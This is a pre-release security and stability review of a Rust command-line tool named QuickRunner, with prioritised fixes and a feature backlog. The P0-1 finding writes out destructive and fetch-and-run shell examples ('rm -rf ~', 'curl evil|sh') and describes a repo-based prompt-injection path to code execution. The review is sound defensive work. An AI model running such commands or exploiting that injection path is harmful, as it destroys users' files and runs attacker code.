# QuickRunner (`qr`) — Pre-Release Review & Hardening Plan

Three independent review streams + a feature-gap pass, ~110 agents, cross-validated against a hand read of 11 of 19 source files.

- **Stream 1 — Workflow:** 7-dimension review + thermo-nuclear structural lens, **88 findings each adversarially verified** (85 confirmed, 2 refuted, 1 uncertain).
- **Stream 2 — Codex (GPT-5.5):** 3 adversarial reviewers (security / concurrency-correctness / architecture-release).
- **Stream 3 — Thermo-nuclear:** 31 confirmed structural findings (maintainability lens).
- **Feature subagent:** separate backlog (below).

Confidence convention: items flagged by ≥2 independent streams + my own read are HIGH-CONFIDENCE.

## Verdict on the architecture

The **module layering is sound** — business logic lives in `lib` modules (`go`/`run`/`scanner`/`config`/`ai`/`stats_db`), dispatch is reasonably thin, and the workflow's own architecture reviewer called the layering "solid." This is a good base. It is **not yet a *stable* base**, for five cross-cutting reasons, none of which are the module graph:

1. **No atomic-write primitive.** Cache, config, `.zshrc`, and profiles are all `fs::write` truncate-then-write, so any interruption or concurrent reader corrupts them.
2. **No resilience to corrupt state.** A corrupt config bricks *every* command incl. recovery; a corrupt cache hard-fails `qr go`.
3. **`qr do`'s security model is unsound** — the allowlist doesn't constrain what runs.
4. **Stats are wired into the critical path** and can fail an otherwise-successful command.
5. **`init` (250 lines of prompts/cron/file-mutation) lives in `main.rs`** — the one place that's hardest to test, and the riskiest code (dotfile + crontab mutation).

Fix those five and you have the robust base you want. The rest is correctness polish, release hygiene, and maintainability.

---

# PRIORITIZED FIX LIST

## P0 — Release blockers (do not go public without these)

### P0-1 — `qr do` allowlist is illusory → arbitrary shell execution  🔴 all 5 streams
**What:** `is_command_allowed` ([do_cmd.rs:105](src/commands/do_cmd.rs:105)) checks only the first whitespace token, but `run_shell_command` ([do_cmd.rs:153](src/commands/do_cmd.rs:153)) runs the *whole* string via `/bin/sh -c`. So `git status; rm -rf ~`, `cargo x && curl evil|sh`, `find . -exec rm -rf {} +` all pass the gate. Worse, the prompt **defaults to YES on bare Enter** for allowlisted commands ([do_cmd.rs:146](src/commands/do_cmd.rs:146)), and the default allowlist ships `rm`, `find`, `git` ([config/default.toml](config/default.toml) / [config.rs:188](src/config.rs:188)). The command text is AI-generated from free-form task text **plus a repo-committed `.qr/profile.json`** ([do_cmd.rs:60](src/commands/do_cmd.rs:60),[110](src/commands/do_cmd.rs:110)) → a malicious cloned repo is a prompt-injection→code-execution vector against any contributor who runs `qr do` in it.
**Why it matters:** The advertised safety mechanism provides essentially no guarantee. This is the single biggest risk in the codebase and directly undermines "trustworthy base."
**Fix:** Parse with a real shell-word splitter (`shlex`) and **refuse to auto-approve** anything containing shell control operators (`; | & && || > < $() `` {} \n`) — fall through to the explicit `[y/N]` path; or exec the parsed argv directly without `/bin/sh`. Make the allowlisted prompt default to **No**. Remove `rm`/`find` from the default allowlist. Treat profile text as data, not instructions. Update the test at [do_cmd.rs:209](src/commands/do_cmd.rs:209) which currently *pins the broken behavior*.
**Cost of deferring:** A distracted Enter — or a crafted repo — can delete files or fetch+run a remote payload, on a tool that markets the allowlist as the safety net. Reputationally and legally the worst possible launch bug.

### P0-2 — No LICENSE file  🔴
**What:** `Cargo.toml` declares `license = "MIT"` and the PRD promises MIT, but there is **no LICENSE file** ([Cargo.toml:5](Cargo.toml:5)).
**Why:** Without it, default copyright law makes the code all-rights-reserved — nobody may legally use/fork/redistribute it, and GitHub won't detect a license.
**Fix:** Add `LICENSE` (MIT text, correct holder/year) before flipping public.
**Cost of deferring:** The repo is legally unusable by the people you're open-sourcing it for; fixing it post-facto with external contributions already in creates provenance ambiguity.

### P0-3 — API key exposure (at-rest + cleartext + TOCTOU)  🔴
**What:** `qr init` requires the literal key, stores it in `config.toml` ([main.rs:309](src/main.rs:309),[252](src/main.rs:252),[275](src/main.rs:275)), echoes it on screen, and applies `chmod 600` *after* `fs::write` ([main.rs:275-276](src/main.rs:275)) — a world-readable window + symlink-follow. PRD line 379 explicitly says keys are "never stored in config."
**Why:** First-run leaks a provider secret to terminal scrollback, tmux/CI logs, and a plaintext dotfile; ships a documented security promise the code violates.
**Fix:** Prompt for an *env-var name*, not the secret; default `api_key` empty; if storing is opt-in, create the file atomically with `OpenOptionsExt::mode(0o600)` + `create_new`, refuse symlinks, and read with a no-echo prompt (`rpassword`).
**Cost of deferring:** Security-conscious/enterprise users (your stated audience) bounce on first run; a real secret-leakage path ships.

### P0-4 — Internal artifact `.meowcode.json` is tracked  🟠
**What:** `.meowcode.json` (internal Discord reply-routing metadata) is committed and will ship publicly.
**Fix:** `git rm --cached .meowcode.json` + `.gitignore`; audit for other internal files.
**Cost of deferring:** Leaks unrelated internal tooling into a repo you're presenting as a clean base.

## P1 — High: stability/robustness (the "robust base" you asked for)

### P1-1 — Introduce one atomic-write primitive (cache/config/rc/profile)  🔴 HIGH-CONF (4 streams)
**What:** All state writes are truncate-then-write `fs::write` ([scanner.rs:96](src/scanner.rs:96), [shell.rs:182](src/shell.rs:182), [config.rs](src/config.rs), [project_profile.rs](src/project_profile.rs)), and follow symlinks. The live trigger: the hourly cron `qr scan` writing the cache while an interactive `qr go` reads it → `serde_json` parse error aborts the `cd`. The dangerous one: an interrupted `.zshrc` write **corrupts the user's shell startup file** (no backup).
**Why:** Intermittent headline-command failures + potential dotfile corruption are exactly the "unstable base" symptoms.
**Fix:** One `atomic_write(path, bytes)` = temp file in same dir → `fs::rename`; back up `.zshrc`/crontab before mutation; refuse symlink targets.
**Cost of deferring:** Nondeterministic `qr go` failures that look like corrupted state; rare-but-catastrophic dotfile loss.

### P1-2 — Resilience to corrupt config & cache  🔴 HIGH-CONF
**What:** `AppConfig::load()?` runs for *every* command before dispatch ([main.rs:111](src/main.rs:111)), so a malformed `config.toml` makes **even `qr config path` / `qr init` fail** — no in-tool recovery. Separately, `load_or_scan_projects` only falls back on missing/empty cache, not a *corrupt* one ([scanner.rs:83](src/scanner.rs:83)) → a truncated cache (from P1-1) hard-fails `qr go` until manual deletion.
**Fix:** Treat cache parse-failure as a cache-miss (warn→stderr, rescan, atomic rewrite). Route `qr config`/`qr config path`/`qr init` to run *without* a successful full-config load; add `qr config doctor/reset`; include the path in parse errors.
**Cost of deferring:** One bad keystroke in the config makes the whole CLI feel bricked with no documented recovery.

### P1-3 — Interactive picker is dead through the shell wrapper  🟠 HIGH-CONF (3 streams)
**What:** The multi-match picker is gated on `stdout().is_terminal()` ([go.rs:27](src/commands/go.rs:27)), but the wrapper always runs `qr go … --print-path` inside `$(…)`, so stdout is a pipe → it falls through to a hard "Multiple matches" error. The PRD's headline fuzzy-pick feature never fires on the primary path. (Stderr discipline is otherwise correct — stats go to stderr, stdout stays path-only.)
**Fix:** Gate on `stdin` being a TTY; drive the menu on `/dev/tty` (or stderr); keep stdout for the final path only.
**Cost of deferring:** Every ambiguous `qr go` (common in monorepos / duplicate names) hard-errors instead of letting the user pick.

### P1-4 — Stats failure turns a successful command into exit 1  🟠 HIGH-CONF
**What:** Stats are recorded after execution with `?` ([main.rs:212-217](src/main.rs:212)); `qr do` always records (`ai_used`), and SQLite opens with **no `busy_timeout`/WAL** ([stats_db.rs:38](src/stats_db.rs:38)). Two concurrent `qr do` → `SQLITE_BUSY` → the successful command returns an error and exit 1. (Scoped: default `qr go` is unaffected since stats default off.)
**Fix:** Make stats best-effort (log failures to stderr, never fail the command); set `busy_timeout` + WAL.
**Cost of deferring:** Unreliable scripting semantics — a command does its work *and* reports failure under normal parallel terminal use.

### P1-5 — `init` is a non-transactional multi-step mutation; picker can wreck the terminal  🟠
**What:** `qr init` writes config → mutates `.zshrc` → mutates crontab → scans with no rollback ([main.rs:275-300](src/main.rs:275)); a mid-flow failure leaves partial state. Separately, the picker sets raw mode with **no Drop guard** ([picker.rs:16](src/picker.rs:16)) → a panic/IO error mid-selection leaves the user's shell in raw mode.
**Fix:** Phase `init` with backups + a final state table + idempotent repair-on-rerun (pairs with P1-1). Wrap raw-mode in a guard struct whose `Drop` restores the terminal.
**Cost of deferring:** First-run failures strand users in half-configured states; the everyday `qr go` can occasionally break the terminal.

## P2 — Medium: correctness + release readiness

| # | What | File | Why / Defer cost |
|---|---|---|---|
| P2-1 | **Scanner descends into dot-dirs** (`filter` not `filter_entry`) → detects bogus projects nested in `.git`/`node_modules`/`.config`; wastes work | [scanner.rs:47](src/scanner.rs:47) | Bogus cache entries + slow scans; existing test doesn't cover nested case. Use `WalkDir::filter_entry`. |
| P2-2 | **`cargo test` overwrites the developer's REAL cache on macOS** — test binaries disagree on isolation var (`QR_CONFIG_DIR` vs `XDG_CONFIG_HOME`); verifier reproduced it | [tests/perf_timing.rs](tests/perf_timing.rs), [benches/common](benches/common/mod.rs) | Developer-hostile; standardize all tests/benches on `QR_CONFIG_DIR`. |
| P2-3 | **SQLite has no migration path** (`CREATE TABLE IF NOT EXISTS` only) | [stats_db.rs:105](src/stats_db.rs:105) | Any future column strands early adopters with a permanently failing stats DB. Add `PRAGMA user_version` migrations. |
| P2-4 | **`--print-path` contract has no pinning test** (it's `hide=true`, load-bearing) | [main.rs:466](src/main.rs:466) | A future stray `println!` silently breaks `cd`. Add a characterization test asserting stdout == path, stats on stderr. (Matches your "fortify contracts" rule.) |
| P2-5 | **Cost is always `$0.000`** but surfaced as authoritative in `qr do` + `qr stats` | [ai/client.rs:207](src/ai/client.rs:207) | Reads as broken to first users. Either implement a per-model price table + pinned test, or remove the cost column until real. |
| P2-6 | **Docs drift** (multiple): README config path `~/.config` vs macOS `~/Library/Application Support`; README says `qr do` is "v2/architecture-only" but it executes; PRD "key never stored" vs reality; PRD "cron installs by default" vs now-prompted; README Install omits `qr init`/shell-integration | README.md, PRD.md | First-run users misled about where secrets live and whether AI execution is active. |
| P2-7 | **No CI / MSRV / CHANGELOG / CONTRIBUTING / SECURITY** | repo-level | No automated `build/test/clippy/fmt` gate for contributor PRs; no `rust-version=1.85` for edition-2024; no contribution process. |
| P2-8 | **`qr run` silently eats a leading `watch`/`log`/`output` token** as a mode | [run.rs:41](src/commands/run.rs:41) | A script literally named `log` is mis-run. Make mode an explicit `--mode`/`--` flag. |
| P2-9 | Smaller correctness: signal-killed children collapse to exit 1 (no 128+sig) [main.rs:145]; `rank_matches` mixes cased/uncased query → mixed-case fuzzy misses [go.rs:72]; alias add doesn't escape `'` → breaks/injects rc [shell.rs:16]; cron line doesn't quote the binary path [shell.rs:138]; `git_remote_name` can mis-attribute a URL / yield empty name [scanner.rs:144],[180]; `run.rs` `shell_escape` quoting bug (latent, currently unreachable) [run.rs:124] | various | Each a real edge-case bug; individually low, collectively the "rough edges" of a v1. |

## P3 — Structural / maintainability (thermo-nuclear) — do during the hardening pass

Mostly LOW/INFO; the point is to do them *while* touching these files for P0–P2 so the base stays clean:
- **Move `init` + prompt/cron helpers out of `main.rs` into `commands::init`** ([main.rs:220-464](src/main.rs:220)) — the one real structural wart.
- **One `atomic_write` + one `shell_quote` helper** (currently duplicated/divergent, one quoting impl is buggy) [run.rs:124] / [do_cmd.rs:191].
- **Collapse `AiConfig`/`FallbackAiConfig`/`ProviderConfig`** into one via serde `flatten` ([config.rs:35](src/config.rs:35)) — removes field-by-field copying + drift risk.
- **One `PROJECT_MARKERS` / `is_project_root`** (currently divergent across scanner.rs & project_profile.rs).
- **Replace `__skip_stats__`/`__default__` sentinel strings** with a typed `StatsIntent`/dispatch enum ([main.rs:175](src/main.rs:175)).
- **Table-driven `LanguageSpec`** for the 5 near-identical `detect_*_profile`/entry-point fns ([project_profile.rs:124](src/project_profile.rs:124)).
- Single `AiProtocol::FromStr` (protocol parsing is triplicated, and rejects the `-compatible` aliases init advertises) [main.rs:363]; typed `ProjectSource` enum; remove dead `log_path` binding [main.rs:139]; one source of truth for defaults (default.toml vs `default_auto_approve`).

**Refuted (don't chase these):** `create_dir_all` TOCTOU race (idempotent) and scanner symlink loops (`follow_links(false)` already set).

---

# FEATURE BACKLOG (separate — incomplete vs missing vs needed)

Headline: the **PRD v1 scope table is stale** — it marks `qr do`/`qr learn` as "❌ v2" but **both are implemented**; several of their sub-behaviors are stubbed.

**Incomplete (exists but partial):**
- Real **AI cost estimation** (hardcoded 0.0) — *must*.
- **`qr do` delegate mode only *prints* suggestions**, never launches `codex/claude` despite the PRD `Launch? [codex/claude/n]` flow — *should*.
- **`qr run` ignores learned profiles / `.qr.toml [commands]`** — `qr run deploy` won't resolve a project-defined script — *should*.
- **Stale cache never auto-refreshes** — `scan_interval_hours` + `scanned_at_unix_ms` exist but `load_or_scan_projects` never checks them ([scanner.rs:83](src/scanner.rs:83)); with cron now opt-in, the cache can go stale forever — *should*.
- NL→alias AI path; `qr learn` staleness/auto-refresh; picker pagination unreachable past 9 (rank caps at 9) — *could*.

**Missing (a published CLI needs):**
- **Shell completions** (`clap_complete`) — *must*.
- **`qr uninstall`** (remove wrapper + cron + config; add sentinel markers to the wrapper *now* so it's removable later) — *must*.
- **`qr config validate`** — *should*.
- **stats reset/export + cache clear** (SQLite grows unbounded) — *should*.
- **Privacy note** (what leaves the machine on `qr do`: task + full project profile → 3rd-party endpoint) + **Windows stance** (`/bin/sh`, `crontab`, `PermissionsExt` are unix-only) — *should*.
- Man page; self-update — *could*.

**Enhancements (to be competitive — vs zoxide/just/navi):**
- **Frecency ranking for `qr go`** (zoxide's core value; currently pure string match) — *should*.
- `qr go -` / recent list; **fzf-style type-to-filter picker**; `qr run --list`; project tags; `qr do --last`; spinner for `qr do`; plugin system (XL, v2+) — *could*.

**Suggested v1.0 cut line:** P0 + P1 (security/stability) + the *must* features (real cost or remove it, completions, uninstall, fix scope-table drift) → a base a reviewer would confidently ship.
